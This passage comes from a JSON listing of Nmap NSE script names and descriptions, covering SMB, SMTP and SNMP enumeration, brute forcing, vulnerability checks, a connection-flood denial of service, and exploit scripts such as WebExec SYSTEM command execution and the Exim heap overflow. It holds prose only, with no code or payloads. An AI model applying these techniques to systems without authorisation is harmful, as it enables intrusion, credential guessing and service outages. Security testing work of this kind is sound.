    "description": "Attempts to list shares using the <code>srvsvc.NetShareEnumAll</code> MSRPC function and\nretrieve more information about them using <code>srvsvc.NetShareGetInfo</code>. If access\nto those functions is denied, a list of common share names are checked.\n\nFinding open shares is useful to a penetration tester because there may be private files\nshared, or, if it's writable, it could be a good place to drop a Trojan or to infect a file\nthat's already there. Knowing where the share is could make those kinds of tests more useful,\nexcept that determining where the share is requires administrative privileges already.\n\nRunning <code>NetShareEnumAll</code> will work anonymously against Windows 2000, and\nrequires a user-level account on any other Windows version. Calling <code>NetShareGetInfo</code>\nrequires an administrator account on all versions of Windows up to 2003, as well as Windows Vista\nand Windows 7, if UAC is turned down.\n\nEven if <code>NetShareEnumAll</code> is restricted, attempting to connect to a share will always\nreveal its existence. So, if <code>NetShareEnumAll</code> fails, a pre-generated list of shares,\nbased on a large test network, are used. If any of those succeed, they are recorded.\n\nAfter a list of shares is found, the script attempts to connect to each of them anonymously,\nwhich divides them into \"anonymous\", for shares that the NULL user can connect to, or \"restricted\",\nfor shares that require a user account.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-enum-users.nse",
    "description": "Attempts to enumerate the users on a remote Windows system, with as much\ninformation as possible, through two different techniques (both over MSRPC,\nwhich uses port 445 or 139; see <code>smb.lua</code>). The goal of this script\nis to discover all user accounts that exist on a remote system. This can be\nhelpful for administration, by seeing who has an account on a server, or for\npenetration testing or network footprinting, by determining which accounts\nexist on a system.\n\nA penetration tester who is examining servers may wish to determine the\npurpose of a server. By getting a list of who has access to it, the tester\nmight get a better idea (if financial people have accounts, it probably\nrelates to financial information). Additionally, knowing which accounts\nexist on a system (or on multiple systems) allows the pen-tester to build a\ndictionary of possible usernames for bruteforces, such as a SMB bruteforce\nor a Telnet bruteforce. These accounts may be helpful for other purposes,\nsuch as using the accounts in Web applications on this or other servers.\n\nFrom a pen-testers perspective, retrieving the list of users on any\ngiven server creates endless possibilities.\n\nUsers are enumerated in two different ways:  using SAMR enumeration or\nLSA bruteforcing. By default, both are used, but they have specific\nadvantages and disadvantages. Using both is a great default, but in certain\ncircumstances it may be best to give preference to one.\n\nAdvantages of using SAMR enumeration:\n* Stealthier (requires one packet/user account, whereas LSA uses at least 10 packets while SAMR uses half that; additionally, LSA makes a lot of noise in the Windows event log (LSA enumeration is the only script I (Ron Bowes) have been called on by the administrator of a box I was testing against).\n* More information is returned (more than just the username).\n* Every account will be found, since they're being enumerated with a function that's designed to enumerate users.\n\nAdvantages of using LSA bruteforcing:\n* More accounts are returned (system accounts, groups, and aliases are returned, not just users).\n* Requires a lower-level account to run on Windows XP and higher (a 'guest' account can be used, whereas SAMR enumeration requires a 'user' account; especially useful when only guest access is allowed, or when an account has a blank password (which effectively gives it guest access)).\n\nSAMR enumeration is done with the  <code>QueryDisplayInfo</code> function.\nIf this succeeds, it will return a detailed list of users, along with descriptions,\ntypes, and full names. This can be done anonymously against Windows 2000, and\nwith a user-level account on other Windows versions (but not with a guest-level account).\n\nTo perform this test, the following functions are used:\n* <code>Bind</code>: bind to the SAMR service.\n* <code>Connect4</code>: get a connect_handle.\n* <code>EnumDomains</code>: get a list of the domains.\n* <code>QueryDomain</code>: get the sid for the domain.\n* <code>OpenDomain</code>: get a handle for each domain.\n* <code>QueryDisplayInfo</code>: get the list of users in the domain.\n* <code>Close</code>: Close the domain handle.\n* <code>Close</code>: Close the connect handle.\nThe advantage of this technique is that a lot of details are returned, including\nthe full name and description; the disadvantage is that it requires a user-level\naccount on every system except for Windows 2000. Additionally, it only pulls actual\nuser accounts, not groups or aliases.\n\nRegardless of whether this succeeds, a second technique is used to pull\nuser accounts, called LSA bruteforcing. LSA bruteforcing can be done anonymously\nagainst Windows 2000, and requires a guest account or better on other systems.\nIt has the advantage of running with less permission, and will also find more\naccount types (i.e., groups, aliases, etc.). The disadvantages is that it returns\nless information, and that, because it's a brute-force guess, it's possible to miss\naccounts. It's also extremely noisy.\n\nThis isn't a brute-force technique in the common sense, however: it's a brute-forcing of users'\nRIDs. A user's RID is a value (generally 500, 501, or 1000+) that uniquely identifies\na user on a domain or system. An LSA function is exposed which lets us convert the RID\n(say, 1000) to the username (say, \"Ron\"). So, the technique will essentially try\nconverting 1000 to a name, then 1001, 1002, etc., until we think we're done.\n\nTo do this, the script breaks users into groups of RIDs based on the <code>LSA_GROUPSIZE</code>\nconstant. All members of this group are checked simultaneously, and the responses recorded.\nWhen a series of empty groups are found (<code>LSA_MINEMPTY</code> groups, specifically),\nthe scan ends. As long as you are getting a few groups with active accounts, the scan will\ncontinue.\n\nBefore attempting this conversion, the SID of the server has to be determined.\nThe SID is determined by doing the reverse operation; that is, by converting a name into\nits RID. The name is determined by looking up any name present on the system.\nWe try:\n* The computer name and domain name, returned in <code>SMB_COM_NEGOTIATE</code>;\n* An nbstat query to get the server name and the user currently logged in; and\n* Some common names: \"administrator\", \"guest\", and \"test\".\n\nIn theory, the computer name should be sufficient for this to always work, and\nit has so far has in my tests, but I included the rest of the names for good measure. It\ndoesn't hurt to add more.\n\nThe names and details from both of these techniques are merged and displayed.\nIf the output is verbose, then extra details are shown. The output is ordered alphabetically.\n\nCredit goes out to the <code>enum.exe</code>, <code>sid2user.exe</code>, and\n<code>user2sid.exe</code> programs for pioneering some of the techniques used\nin this script.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-flood.nse",
    "description": "Exhausts a remote SMB server's connection limit by by opening as many\nconnections as we can.  Most implementations of SMB have a hard global\nlimit of 11 connections for user accounts and 10 connections for\nanonymous. Once that limit is reached, further connections are\ndenied. This script exploits that limit by taking up all the\nconnections and holding them.\n\nThis works better with a valid user account, because Windows reserves\none slot for valid users. So, no matter how many anonymous connections\nare taking up spaces, a single valid user can still log in.\n\nThis is *not* recommended as a general purpose script, because a) it\nis designed to harm the server and has no useful output, and b) it\nnever ends (until timeout).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-ls.nse",
    "description": "Attempts to retrieve useful information about files shared on SMB volumes.\nThe output is intended to resemble the output of the UNIX <code>ls</code> command.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-mbenum.nse",
    "description": "Queries information managed by the Windows Master Browser.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-os-discovery.nse",
    "description": "Attempts to determine the operating system, computer name, domain, workgroup, and current\ntime over the SMB protocol (ports 445 or 139).\nThis is done by starting a session with the anonymous\naccount (or with a proper user account, if one is given; it likely doesn't make\na difference); in response to a session starting, the server will send back all this\ninformation.\n\nThe following fields may be included in the output, depending on the\ncircumstances (e.g. the workgroup name is mutually exclusive with domain and forest\nnames) and the information available:\n* OS\n* Computer name\n* Domain name\n* Forest name\n* FQDN\n* NetBIOS computer name\n* NetBIOS domain name\n* Workgroup\n* System time\n\nSome systems, like Samba, will blank out their name (and only send their domain).\nOther systems (like embedded printers) will simply leave out the information. Other\nsystems will blank out various pieces (some will send back 0 for the current\ntime, for example).\n\nIf this script is used in conjunction with version detection it can augment the\nstandard nmap version detection information with data that this script has discovered.\n\nRetrieving the name and operating system of a server is a vital step in targeting\nan attack against it, and this script makes that retrieval easy. Additionally, if\na penetration tester is choosing between multiple targets, the time can help identify\nservers that are being poorly maintained (for more information/random thoughts on\nusing the time, see http://www.skullsecurity.org/blog/?p=76.\n\nAlthough the standard <code>smb*</code> script arguments can be used,\nthey likely won't change the outcome in any meaningful way. However, <code>smbnoguest</code>\nwill speed up the script on targets that do not allow guest access.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-print-text.nse",
    "description": "Attempts to print text on a shared printer by calling Print Spooler Service RPC functions.\n\nIn order to use the script, at least one printer needs to be shared\nover SMB. If no printer is specified, script tries to enumerate existing\nones by calling LANMAN API which might not be always available.\nLANMAN is available by default on Windows XP, but not on Vista or Windows 7\nfor example. In that case, you need to specify printer share name manually\nusing <code>printer</code> script argument. You can find out available shares\nby using smb-enum-shares script.\n\nLater versions of Windows require valid credentials by default\nwhich you can specify trough smb library arguments <code>smbuser</code> and\n<code>smbpassword</code> or other options.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-protocols.nse",
    "description": "Attempts to list the supported protocols and dialects of a SMB server.\n\nThe script attempts to initiate a connection using the dialects:\n* NT LM 0.12 (SMBv1)\n* 2.0.2      (SMBv2)\n* 2.1        (SMBv2)\n* 3.0        (SMBv3)\n* 3.0.2      (SMBv3)\n* 3.1.1      (SMBv3)\n\nAdditionally if SMBv1 is found enabled, it will mark it as insecure. This\nscript is the successor to the (removed) smbv2-enabled script.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-psexec.nse",
    "description": "No description available",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-security-mode.nse",
    "description": "Returns information about the SMB security level determined by SMB.\n\nHere is how to interpret the output:\n\n* User-level authentication: Each user has a separate username/password that\n  is used to log into the system. This is the default setup of pretty much\n  everything these days.\n* Share-level authentication: The anonymous account should be used to log\n  in, then the password is given (in plaintext) when a share is accessed.\n  All users who have access to the share use this password. This was the\n  original way of doing things, but isn't commonly seen, now. If a server\n  uses share-level security, it is vulnerable to sniffing.\n* Challenge/response passwords supported: If enabled, the server can accept\n  any type of password (plaintext, LM and NTLM, and LMv2 and NTLMv2).  If it\n  isn't set, the server can only accept plaintext passwords. Most servers\n  are configured to use challenge/response these days. If a server is\n  configured to accept plaintext passwords, it is vulnerable to sniffing. LM\n  and NTLM are fairly secure, although there are some brute-force attacks\n  against them.  Additionally, LM and NTLM can fall victim to\n  man-in-the-middle attacks or relay attacks (see MS08-068 or my writeup of\n  it: http://www.skullsecurity.org/blog/?p=110.\n* Message signing: If required, all messages between the client and server\n  must be signed by a shared key, derived from the password and the server\n  challenge. If supported and not required, message signing is negotiated\n  between clients and servers and used if both support and request it. By\n  default, Windows clients don't sign messages, so if message signing isn't\n  required by the server, messages probably won't be signed; additionally,\n  if performing a man-in-the-middle attack, an attacker can negotiate no\n  message signing. If message signing isn't required, the server is\n  vulnerable to man-in-the-middle attacks or SMB-relay attacks.\n\nThis script will allow you to use the <code>smb*</code> script arguments (to\nset the username and password, etc.), but it probably won't ever require\nthem.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-server-stats.nse",
    "description": "Attempts to grab the server's statistics over SMB and MSRPC, which uses TCP\nports 445 or 139.\n\nAn administrator account is required to pull these statistics on most versions\nof Windows, and Vista and above require UAC to be turned down.\n\nSome of the numbers returned here don't feel right to me, but they're definitely\nthe numbers that Windows returns. Take the values here with a grain of salt.\n\nThese statistics are found using a single call to a SRVSVC function,\n<code>NetServerGetStatistics</code>. This packet is parsed incorrectly by Wireshark,\nup to version 1.0.3 (and possibly higher).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-system-info.nse",
    "description": "Pulls back information about the remote system from the registry. Getting all\nof the information requires an administrative account, although a user account\nwill still get a lot of it. Guest probably won't get any, nor will anonymous.\nThis goes for all operating systems, including Windows 2000.\n\nWindows Vista disables remote registry access by default, so unless it was enabled,\nthis script won't work.\n\nIf you know of more information stored in the Windows registry that could be interesting,\npost a message to the nmap-dev mailing list and I (Ron Bowes) will add it to my todo list.\nAdding new checks to this is extremely easy.\n\nWARNING: I have experienced crashes in <code>regsvc.exe</code> while making registry calls\nagainst a fully patched Windows 2000 system; I've fixed the issue that caused it,\nbut there's no guarantee that it (or a similar vuln in the same code) won't show\nup again. Since the process automatically restarts, it doesn't negatively impact\nthe system, besides showing a message box to the user.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-conficker.nse",
    "description": "Detects Microsoft Windows systems infected by the Conficker worm. This check is dangerous and\nit may crash systems.\n\nBased loosely on the Simple Conficker Scanner, found here:\n-- http://iv.cs.uni-bonn.de/wg/cs/applications/containing-conficker/\n\nThis check was previously part of smb-check-vulns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-cve-2017-7494.nse",
    "description": "Checks if target machines are vulnerable to the arbitrary shared library load\nvulnerability CVE-2017-7494.\n\nUnpatched versions of Samba from 3.5.0 to 4.4.13, and versions prior to\n4.5.10 and 4.6.4 are affected by a vulnerability that allows remote code\nexecution, allowing a malicious client to upload a shared library to a writable\nshare, and then cause the server to load and execute it.\n\nThe script does not scan the version numbers by default as the patches released\nfor the mainstream Linux distributions do not change the version numbers.\n\nThe script checks the preconditions for the exploit to happen:\n\n1)  If the argument check-version is applied, the script will ONLY check\n    services running potentially vulnerable versions of Samba, and run the\n    exploit against those services. This is useful if you wish to scan a\n    group of hosts quickly for the vulnerability based on the version number.\n    However, because of their version number, some patched versions may still\n    show up as likely vulnerable. Here, we use smb.get_os(host) to do\n    versioning of the Samba version and compare it to see if it is a known\n    vulnerable version of Samba. Note that this check is not conclusive:\n    See 2,3,4\n\n2)  Whether there exists writable shares for the execution of the script.\n    We must be able to write to a file to the share for the exploit to\n    take place. We hence enumerate the shares using\n    smb.share_find_writable(host) which returns the main_name, main_path\n    and a list of writable shares.\n\n3)  Whether the workaround (disabling of named pipes) was applied.\n    When \"nt pipe support = no\" is configured on the host, the service\n    would not be exploitable. Hence, we check whether this is configured\n    on the host using smb.share_get_details(host, 'IPC$'). The error\n    returned would be \"NT_STATUS_ACCESS_DENIED\" if the workaround is\n    applied.\n\n4)  Whether we can invoke the payloads from the shares.\n    Using payloads from Metasploit, we upload the library files to\n    the writable share obtained from 2). We then make a named pipe request\n    using NT_CREATE_ANDX_REQUEST to the actual local filepath and if the\n    payload executes, the status return will be false. Note that only\n    Linux_x86 and Linux_x64 payloads are tested in this script.\n\nThis script is based on the metasploit module written by hdm.\n\nReferences:\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb\n* https://www.samba.org/samba/security/CVE-2017-7494.html\n* http://blog.nsfocus.net/samba-remote-code-execution-vulnerability-analysis/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-cve2009-3103.nse",
    "description": "Detects Microsoft Windows systems vulnerable to denial of service (CVE-2009-3103).\nThis script will crash the service if it is vulnerable.\n\nThe script performs a denial-of-service against the vulnerability disclosed in\nCVE-2009-3103. This works against Windows Vista and some versions of Windows 7,\nand causes a bluescreen if successful. The proof-of-concept code at\nhttp://seclists.org/fulldisclosure/2009/Sep/39 was used, with one small change.\n\nThis check was previously part of smb-check-vulns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms06-025.nse",
    "description": "Detects Microsoft Windows systems with Ras RPC service vulnerable to MS06-025.\n\nMS06-025 targets the <code>RasRpcSumbitRequest()</code> RPC method which is\na part of RASRPC interface that serves as a RPC service for configuring and\ngetting information from the Remote Access and Routing service. RASRPC can be\naccessed using either \"\\ROUTER\" SMB pipe or the \"\\SRVSVC\" SMB pipe (usually on Windows XP machines).\nThis is in RPC world known as \"ncan_np\" RPC transport. <code>RasRpcSumbitRequest()</code>\nmethod is a generic method which provides different functionalities according\nto the <code>RequestBuffer</code> structure and particularly the <code>RegType</code> field within that\nstructure. <code>RegType</code> field is of <code>enum ReqTypes</code> type. This enum type lists all\nthe different available operation that can be performed using the <code>RasRpcSubmitRequest()</code>\nRPC method. The one particular operation that this vuln targets is the <code>REQTYPE_GETDEVCONFIG</code>\nrequest to get device information on the RRAS.\n\nThis script was previously part of smb-check-vulns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms07-029.nse",
    "description": "Detects Microsoft Windows systems with Dns Server RPC vulnerable to MS07-029.\n\nMS07-029 targets the <code>R_DnssrvQuery()</code> and <code>R_DnssrvQuery2()</code>\nRPC method which isa part of DNS Server RPC interface that serves as a RPC service\nfor configuring and getting information from the DNS Server service.\nDNS Server RPC service can be accessed using \"\\dnsserver\" SMB named pipe.\nThe vulnerability is triggered when a long string is send as the \"zone\" parameter\nwhich causes the buffer overflow which crashes the service.\n\nThis check was previously part of smb-check-vulns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms08-067.nse",
    "description": "Detects Microsoft Windows systems vulnerable to the remote code execution vulnerability\nknown as MS08-067. This check is dangerous and it may crash systems.\n\nOn a fairly wide scan conducted by Brandon Enright, we determined\nthat on average, a vulnerable system is more likely to crash than to survive\nthe check. Out of 82 vulnerable systems, 52 crashed.\nPlease consider this before running the script.\n\nThis check was previously part of smb-check-vulns.nse.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms10-054.nse",
    "description": "Tests whether target machines are vulnerable to the ms10-054 SMB remote memory\ncorruption vulnerability.\n\nThe vulnerable machine will crash with BSOD.\n\nThe script requires at least READ access right to a share on a remote machine.\nEither with guest credentials or with specified username/password.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms10-061.nse",
    "description": "Tests whether target machines are vulnerable to ms10-061 Printer Spooler impersonation vulnerability.\n\nThis vulnerability was used in Stuxnet worm.  The script checks for\nthe vuln in a safe way without a possibility of crashing the remote\nsystem as this is not a memory corruption vulnerability.  In order for\nthe check to work it needs access to at least one shared printer on\nthe remote system.  By default it tries to enumerate printers by using\nLANMAN API which on some systems is not available by default. In that\ncase user should specify printer share name as printer script\nargument.  To find a printer share, smb-enum-shares can be used.\nAlso, on some systems, accessing shares requires valid credentials\nwhich can be specified with smb library arguments smbuser and\nsmbpassword.\n\nReferences:\n  - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2729\n  - http://technet.microsoft.com/en-us/security/bulletin/MS10-061\n  - http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-ms17-010.nse",
    "description": "Attempts to detect if a Microsoft SMBv1 server is vulnerable to a remote code\n execution vulnerability (ms17-010, a.k.a. EternalBlue).\n The vulnerability is actively exploited by WannaCry and Petya ransomware and other malware.\n\nThe script connects to the $IPC tree, executes a transaction on FID 0 and\n checks if the error \"STATUS_INSUFF_SERVER_RESOURCES\" is returned to\n determine if the target is not patched against ms17-010. Additionally it checks\n for known error codes returned by patched systems.\n\nTested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016.\n\nReferences:\n* https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n* https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n* https://msdn.microsoft.com/en-us/library/ee441489.aspx\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb\n* https://github.com/cldrn/nmap-nse-scripts/wiki/Notes-about-smb-vuln-ms17-010",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-regsvc-dos.nse",
    "description": "Checks if a Microsoft Windows 2000 system is vulnerable to a crash in regsvc caused by a null pointer\ndereference. This check will crash the service if it is vulnerable and requires a guest account or\nhigher to work.\n\nThe vulnerability was discovered by Ron Bowes while working on <code>smb-enum-sessions</code> and\nwas reported to Microsoft (Case #MSRC8742).\n\nThis check was previously part of smb-check-vulns.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-vuln-webexec.nse",
    "description": "Checks whether the WebExService is installed and allows us to run code.\n\nNote: Requires a user account (local or domain).\n\nReferences:\n* https://www.webexec.org\n* https://blog.skullsecurity.org/2018/technical-rundown-of-webexec\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15442",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb-webexec-exploit.nse",
    "description": "Attempts to run a command via WebExService, using the WebExec vulnerability.\nGiven a Windows account (local or domain), this will start an arbitrary\nexecutable with SYSTEM privileges over the SMB protocol.\n\nThe argument webexec_command will run the command directly. It may or may not\nstart with a GUI. webexec_gui_command will always start with a GUI, and is\nuseful for running commands such as \"cmd.exe\" as SYSTEM if you have access.\n\nReferences:\n* https://www.webexec.org\n* https://blog.skullsecurity.org/2018/technical-rundown-of-webexec",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb2-capabilities.nse",
    "description": "Attempts to list the supported capabilities in a SMBv2 server for each\n enabled dialect.\n\nThe script sends a SMB2_COM_NEGOTIATE command and parses the response\n using the SMB dialects:\n* 2.0.2\n* 2.1\n* 3.0\n* 3.0.2\n* 3.1.1\n\nReferences:\n* https://msdn.microsoft.com/en-us/library/cc246561.aspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb2-security-mode.nse",
    "description": "Determines the message signing configuration in SMBv2 servers\n for all supported dialects.\n\nThe script sends a SMB2_COM_NEGOTIATE request for each SMB2/SMB3 dialect\n and parses the security mode field to determine the message signing\n configuration of the SMB server.\n\nReferences:\n* https://msdn.microsoft.com/en-us/library/cc246561.aspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb2-time.nse",
    "description": "Attempts to obtain the current system date and the start date of a SMB2 server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smb2-vuln-uptime.nse",
    "description": "Attempts to detect missing patches in Windows systems by checking the\nuptime returned during the SMB2 protocol negotiation.\n\nSMB2 protocol negotiation response returns the system boot time\n pre-authentication. This information can be used to determine\n if a system is missing critical patches without triggering IDS/IPS/AVs.\n\nRemember that a rebooted system may still be vulnerable. This check\nonly reveals unpatched systems based on the uptime, no additional probes are sent.\n\nReferences:\n* https://twitter.com/breakersall/status/880496571581857793",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-brute.nse",
    "description": "Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-commands.nse",
    "description": "Attempts to use EHLO and HELP to gather the Extended commands supported by an\nSMTP server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-enum-users.nse",
    "description": "Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO\ncommands. The goal of this script is to discover all the user accounts in the remote\nsystem.\n\nThe script will output the list of user names that were found. The script will stop\nquerying the SMTP server if authentication is enforced. If an error occurs while testing\nthe target host, the error will be printed with the list of any combinations that were\nfound prior to the error.\n\nThe user can specify which methods to use and in which order. The script will ignore\nrepeated methods. If not specified the script will use the RCPT first, then VRFY and EXPN.\nAn example of how to specify the methods to use and the order is the following:\n\n<code>smtp-enum-users.methods={EXPN,RCPT,VRFY}</code>",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-ntlm-info.nse",
    "description": "This script enumerates information from remote SMTP services with NTLM\nauthentication enabled.\n\nSending a SMTP NTLM authentication request with null credentials will\ncause the remote service to respond with a NTLMSSP message disclosing\ninformation to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-open-relay.nse",
    "description": "Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal\nof this script is to tell if a SMTP server is vulnerable to mail relaying.\n\nAn SMTP server that works as an open relay, is a email server that does not verify if the\nuser is authorised to send email from the specified email address. Therefore, users would\nbe able to send email originating from any third-party email address that they want.\n\nThe checks are done based in combinations of MAIL FROM and RCPT TO commands. The list is\nhardcoded in the source file. The script will output all the working combinations that the\nserver allows if nmap is in verbose mode otherwise the script will print the number of\nsuccessful tests. The script will not output if the server requires authentication.\n\nIf debug is enabled and an error occurs while testing the target host, the error will be\nprinted with the list of any combinations that were found prior to the error.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-strangeport.nse",
    "description": "Checks if SMTP is running on a non-standard port.\n\nThis may indicate that crackers or script kiddies have set up a backdoor on the\nsystem to send spam or control the machine.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-vuln-cve2010-4344.nse",
    "description": "Checks for and/or exploits a heap overflow within versions of Exim\nprior to version 4.69 (CVE-2010-4344) and a privilege escalation\nvulnerability in Exim 4.72 and prior (CVE-2010-4345).\n\nThe heap overflow vulnerability allows remote attackers to execute\narbitrary code with the privileges of the Exim daemon\n(CVE-2010-4344). If the exploit fails then the Exim smtpd child will\nbe killed (heap corruption).\n\nThe script also checks for a privilege escalation vulnerability that\naffects Exim version 4.72 and prior. The vulnerability allows the exim\nuser to gain root privileges by specifying an alternate configuration\nfile using the -C option (CVE-2010-4345).\n\nThe <code>smtp-vuln-cve2010-4344.exploit</code> script argument will make\nthe script try to exploit the vulnerabilities, by sending more than 50MB of\ndata, it depends on the message size limit configuration option of the\nExim server. If the exploit succeed the <code>exploit.cmd</code> or\n<code>smtp-vuln-cve2010-4344.cmd</code> script arguments can be used to\nrun an arbitrary command on the remote system, under the\n<code>Exim</code> user privileges. If this script argument is set then it\nwill enable the <code>smtp-vuln-cve2010-4344.exploit</code> argument.\n\nTo get the appropriate debug messages for this script, please use -d2.\n\nSome of the logic of this script is based on the metasploit\nexim4_string_format exploit.\n* http://www.metasploit.com/modules/exploit/unix/smtp/exim4_string_format\n\nReference:\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4344\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4345",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-vuln-cve2011-1720.nse",
    "description": "Checks for a memory corruption in the Postfix SMTP server when it uses\nCyrus SASL library authentication mechanisms (CVE-2011-1720).  This\nvulnerability can allow denial of service and possibly remote code\nexecution.\n\nReference:\n* http://www.postfix.org/CVE-2011-1720.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "smtp-vuln-cve2011-1764.nse",
    "description": "Checks for a format string vulnerability in the Exim SMTP server\n(version 4.70 through 4.75) with DomainKeys Identified Mail (DKIM) support\n(CVE-2011-1764).  The DKIM logging mechanism did not use format string\nspecifiers when logging some parts of the DKIM-Signature header field.\nA remote attacker who is able to send emails, can exploit this vulnerability\nand execute arbitrary code with the privileges of the Exim daemon.\n\nReference:\n* http://bugs.exim.org/show_bug.cgi?id=1106\n* http://thread.gmane.org/gmane.mail.exim.devel/4946\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2011-1764\n* http://en.wikipedia.org/wiki/DomainKeys_Identified_Mail",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "sniffer-detect.nse",
    "description": "Checks if a target on a local Ethernet has its network card in promiscuous mode.\n\nThe techniques used are described at\nhttp://www.securityfriday.com/promiscuous_detection_01.pdf.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-brute.nse",
    "description": "Attempts to find an SNMP community string by brute force guessing.\n\nThis script opens a sending socket and a sniffing pcap socket in parallel\nthreads. The sending socket sends the SNMP probes with the community strings,\nwhile the pcap socket sniffs the network for an answer to the probes. If\nvalid community strings are found, they are added to the creds database and\nreported in the output.\n\nThe script takes the <code>snmp-brute.communitiesdb</code> argument that\nallows the user to define the file that contains the community strings to\nbe used. If not defined, the default wordlist used to bruteforce the SNMP\ncommunity strings is <code>nselib/data/snmpcommunities.lst</code>. In case\nthis wordlist does not exist, the script falls back to\n<code>nselib/data/passwords.lst</code>\n\nNo output is reported if no valid account is found.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-hh3c-logins.nse",
    "description": "Attempts to enumerate Huawei / HP/H3C Locally Defined Users through the\nhh3c-user.mib OID\n\nFor devices running software released pre-Oct 2012 only an SNMP read-only\nstring is required to access the OID. Otherwise a read-write string is\nrequired.\n\nOutput is 'username - password - level: {0|1|2|3}'\n\nPassword may be in cleartext, ciphertext or sha256\nLevels are from 0 to 3 with 0 being the lowest security level\n\nhttps://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03515685\nhttp://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-info.nse",
    "description": "Extracts basic information from an SNMPv3 GET request. The same probe is used\nhere as in the service version detection scan.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-interfaces.nse",
    "description": "Attempts to enumerate network interfaces through SNMP.\n\nThis script can also be run during Nmap's pre-scanning phase and can\nattempt to add the SNMP server's interface addresses to the target\nlist.  The script argument <code>snmp-interfaces.host</code> is\nrequired to know what host to probe.  To specify a port for the SNMP\nserver other than 161, use <code>snmp-interfaces.port</code>.  When\nrun in this way, the script's output tells how many new targets were\nsuccessfully added.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-ios-config.nse",
    "description": "Attempts to downloads Cisco router IOS configuration files using SNMP RW (v1) and display or save them.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-netstat.nse",
    "description": "Attempts to query SNMP for a netstat like output. The script can be used to\nidentify and automatically add new targets to the scan by supplying the\nnewtargets script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-processes.nse",
    "description": "Attempts to enumerate running processes through SNMP.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "snmp-sysdescr.nse",
